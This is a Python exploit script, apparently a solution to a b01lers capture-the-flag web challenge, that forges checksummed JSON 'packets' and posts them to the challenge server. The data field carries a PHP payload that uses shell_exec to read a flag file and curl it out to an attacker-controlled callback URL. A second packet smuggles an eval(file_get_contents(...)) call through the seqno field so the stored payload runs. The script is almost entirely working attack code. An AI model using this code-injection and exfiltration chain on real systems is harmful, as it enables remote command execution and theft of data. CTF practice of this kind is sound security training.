#!/usr/bin/env python3

import requests
import json
from hashlib import sha256
from bs4 import BeautifulSoup


def calculate_len_checksum(packet, cookies):
    stringify = json.dumps(packet)
    while(len(stringify) + 64 != packet["len"]):
        packet["len"] = len(stringify) + 64
        ihl = len(packet["version"]) + len(str(packet["len"])) + len(str(packet["ttl"])) + \
            len(str(packet["seqno"])) + len(str(packet["ackno"])) + len(packet["algo"]) + 64
        packet["ihl"] = ihl + len(str(ihl))
        stringify = json.dumps(packet)

    packet["checksum"] = sha256(str(packet["ihl"] + packet["len"] + packet["ttl"] + int(cookies["seqno"]) + packet["ackno"]).encode()).hexdigest()
    return packet


url = "http://chal.ctf.b01lers.com:3002/packets/send.php"
# **Update this with your server**
callback_url = "http://0.0.0.0:5000"
session = requests.Session()
cookiejar = {'seqno': '0', 'ackno': '1'}
data_packet = {"version": "6.5", "ihl": 0, "len": 0, "ttl": 1, "seqno": 0, "ackno": 1, "algo": "sha256",
               "checksum": "", "data": "$output=shell_exec(\"cat sent/flag.packet.php\");shell_exec(\"curl -XPOST -d'data=$output' " + callback_url + "\");//"}
data_packet = calculate_len_checksum(data_packet, cookiejar)
print(data_packet)

response = session.post(url, cookies=cookiejar, data={'packet': json.dumps(data_packet)})

soup = BeautifulSoup(response.text, 'html.parser')
packet_name = soup.a.get('href')
print("Packet stored: {}".format(packet_name))

eval_packet = {"version": "6.5", "ihl": 0, "len": 0, "ttl": 1, "seqno": str(cookiejar["seqno"] + cookiejar["ackno"]) + "));eval(file_get_contents('" + packet_name + "'));//", "ackno": 1, "algo": "sha256", "checksum": "", "data": ""}
eval_packet = calculate_len_checksum(eval_packet, cookiejar)
print(eval_packet)

response = session.post(url, cookies=cookiejar, data={'packet': json.dumps(eval_packet)})
print(response.text)
print("\nCheck callback post data for flag...")
